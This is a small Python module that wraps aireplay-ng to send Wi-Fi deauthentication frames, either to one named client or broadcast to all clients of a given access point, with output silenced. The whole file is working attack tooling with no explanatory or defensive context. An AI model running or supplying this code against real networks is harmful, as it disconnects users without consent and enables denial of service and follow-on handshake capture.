import subprocess


def deauth_client(interface, number_of_deauth, ap_mac_address, c_mac):
    subprocess.run(['aireplay-ng', '-0', str(number_of_deauth), '-a',
                    ap_mac_address, '-c', c_mac, interface], stdout=subprocess.DEVNULL)


def deauth_broadcast(interface, number_of_deauth, ap_mac_address):
    subprocess.run(['aireplay-ng', '-0', str(number_of_deauth), '-a',
                    ap_mac_address, interface], stdout=subprocess.DEVNULL)
